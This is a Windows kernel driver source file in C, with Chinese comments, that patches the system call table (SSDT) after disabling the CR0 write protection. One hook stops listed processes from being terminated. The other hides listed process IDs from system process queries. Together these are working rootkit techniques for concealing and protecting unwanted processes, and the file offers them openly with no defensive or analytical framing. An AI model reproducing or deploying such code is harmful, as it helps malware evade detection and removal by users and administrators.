#include "ssdt.h"
#include "def.h"

int NumsOfPIDs;
DWORD PIDs[200];

VOID SetHookProcessProtect(int Nums, DWORD*PidList)
{
	NumsOfPIDs=Nums;
	RtlZeroMemory(PIDs,sizeof(PIDs));
	RtlCopyMemory(&PIDs[0],PidList,Nums*sizeof(DWORD));
	DbgPrint("Seted: (ProcessProtect)total number: %d\n",Nums);
} 

typedef NTSTATUS (*ZWTERMINATEPROCESS)
(
	IN HANDLE  ProcessHandle,
	IN NTSTATUS  ExitStatus
);


ZWTERMINATEPROCESS OriZwTerminateProcess;
PULONG pfZwTerminateProcess;
bool HookedProcessProtect=false;

NTSTATUS MyZwTerminateProcess(IN HANDLE ProcessHandle, IN NTSTATUS ExitStatus)
{
	PEPROCESS pEProcessTarget = NULL;
	HANDLE    hID;
	bool      bRet=false;
	
	if (NT_SUCCESS(ObReferenceObjectByHandle(ProcessHandle, STANDARD_RIGHTS_READ, *PsProcessType, KernelMode, (PVOID*)&pEProcessTarget, NULL)))
	{
		hID = PsGetProcessId(pEProcessTarget);

		for(int i=0;i<NumsOfPIDs;i++)
			if((ULONG)hID==PIDs[i])
			{
				bRet=true;
				break;
			}
		ObDereferenceObject(pEProcessTarget);
	}
	return (bRet ? STATUS_ACCESS_DENIED : OriZwTerminateProcess(ProcessHandle, ExitStatus));
}

long HookProcessProtect()
{
	if(HookedProcessProtect)
		return 1;
	pfZwTerminateProcess = FunctionInSSDT(L"ZwTerminateProcess");
	if(pfZwTerminateProcess==NULL)
		return 5;
	OriZwTerminateProcess=(ZWTERMINATEPROCESS)(*pfZwTerminateProcess);
	ClearCR0();
	*pfZwTerminateProcess=(ULONG)MyZwTerminateProcess;
	DbgPrint("---HookProcessProtect---\n");
	RestoreCR0();
	HookedProcessProtect=true;
	return 0;
}

VOID UnHookProcessProtect()
{
	if(!HookedProcessProtect)
		return;
	ClearCR0();
	*pfZwTerminateProcess=(ULONG)OriZwTerminateProcess;
	DbgPrint("---UnHookProcessProtect---\n");
	RestoreCR0();
	HookedProcessProtect=false;
	return;
}




typedef struct _ProcNameLink  
{  
    UNICODE_STRING ProcName;  
    struct _ProcNameLink *pNext;  
}ProcNameLink,*pProcNameLink; 


struct _SYSTEM_THREADS  
{  
	LARGE_INTEGER           KernelTime;  
	LARGE_INTEGER           UserTime;  
	LARGE_INTEGER           CreateTime;  
	ULONG                   WaitTime;  
	PVOID                   StartAddress;  
	CLIENT_ID               ClientIs;  
	KPRIORITY               Priority;  
	KPRIORITY               BasePriority;  
	ULONG                   ContextSwitchCount;  
	ULONG                   ThreadState;  
	KWAIT_REASON            WaitReason;  
};  
//进程信息结构体  
struct _SYSTEM_PROCESSES  
{  
	ULONG                           NextEntryDelta;  
	ULONG                           ThreadCount;  
	ULONG                           Reserved[6];  
	LARGE_INTEGER                   CreateTime;  
	LARGE_INTEGER                   UserTime;  
	LARGE_INTEGER                   KernelTime;  
	UNICODE_STRING                  ProcessName;  
	KPRIORITY                       BasePriority;  
	ULONG                           ProcessId;  
	ULONG                           InheritedFromProcessId;  
	ULONG                           HandleCount;  
	ULONG                           Reserved2[2];  
	VM_COUNTERS                     VmCounters;  
	IO_COUNTERS                     IoCounters; //windows 2000 only  
	struct _SYSTEM_THREADS          Threads[1];  
};  

NTSYSAPI  
NTSTATUS  
NTAPI ZwQuerySystemInformation( 
			IN ULONG SystemInformationClass,  
			IN PVOID SystemInformation,  
			IN ULONG SystemInformationLength,  
			OUT PULONG ReturnLength  
							   );  


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(  
				ULONG SystemInformationCLass,  
				PVOID SystemInformation,  
				ULONG SystemInformationLength,  
				PULONG ReturnLength  
                                            );

int NumsOfPIDs1;
DWORD PIDs1[200];


ZWQUERYSYSTEMINFORMATION OriZwQuerySystemInformation;
PULONG pfZwQuerySystemInformation;
bool HookedProcessHide=false;


NTSTATUS NewZwQuerySystemInformation(  
		IN ULONG SystemInformationClass,  
		IN PVOID SystemInformation,  
		IN ULONG SystemInformationLength,  
		OUT PULONG ReturnLength)  
{  
	
    NTSTATUS ntStatus;   
	
	ntStatus = OriZwQuerySystemInformation(  
		SystemInformationClass,  
		SystemInformation,  
		SystemInformationLength,  
		ReturnLength );  
	
	if( NT_SUCCESS(ntStatus))   
	{  
		if(SystemInformationClass == /*SystemProcessInformation*/5)  
		{       
			for(int i=0;i<NumsOfPIDs1;i++)  
			{  
				//每次产看是，都要从进程列表的开始开始比较  
				struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES*)SystemInformation;  
				struct _SYSTEM_PROCESSES *prev = NULL;  
				while(curr)  
				{  
					if (curr->ProcessName.Buffer != NULL)  
					{  
						if(curr->ProcessId==PIDs1[i])//此处判断要隐藏的进程  
						{  
							//判断要隐藏的进程在链表的那个位置  
							if(prev) // 中间或是在最后  
							{  
								if(curr->NextEntryDelta)  
									prev->NextEntryDelta += curr->NextEntryDelta;  
								else    // 在最后  
									prev->NextEntryDelta = 0;  
							}  
							else  
							{  
								if(curr->NextEntryDelta)  
								{  
									// 要隐藏的进程在第一个  
									SystemInformation = (PCHAR)SystemInformation + curr->NextEntryDelta;  
								}  
								else // 只有当前一个进程  
									SystemInformation = NULL;  
							}  
						}  
					}  
					prev = curr;  
					
					if(curr->NextEntryDelta)
						curr = (_SYSTEM_PROCESSES*)(((PCHAR)curr) + curr->NextEntryDelta);
					else   
						curr = NULL;  
				}  
			}  
		}  
	}  
	return ntStatus;  
}  



VOID SetHookProcessHide(int Nums, DWORD*PidList)
{
	NumsOfPIDs1=Nums;
	RtlZeroMemory(PIDs1,sizeof(PIDs1));
	RtlCopyMemory(&PIDs1[0],PidList,Nums*sizeof(DWORD));
	DbgPrint("Seted: (ProcessHide)total number: %d\n",Nums);
} 


long HookProcessHide()
{
	if(HookedProcessHide)
		return 1;
	pfZwQuerySystemInformation = FunctionInSSDT(L"ZwQuerySystemInformation");
	if(pfZwQuerySystemInformation==NULL)
		return 5;
	OriZwQuerySystemInformation=(ZWQUERYSYSTEMINFORMATION)(*pfZwQuerySystemInformation);
	ClearCR0();
	*pfZwQuerySystemInformation=(ULONG)NewZwQuerySystemInformation;
	DbgPrint("---HookProcessHide---\n");
	RestoreCR0();
	HookedProcessHide=true;
	return 0;
}

VOID UnHookProcessHide()
{
	if(!HookedProcessHide)
		return;
	ClearCR0();
	*pfZwQuerySystemInformation=(ULONG)OriZwQuerySystemInformation;
	DbgPrint("---UnHookProcessHide---\n");
	RestoreCR0();
	HookedProcessHide=false;
	return;
}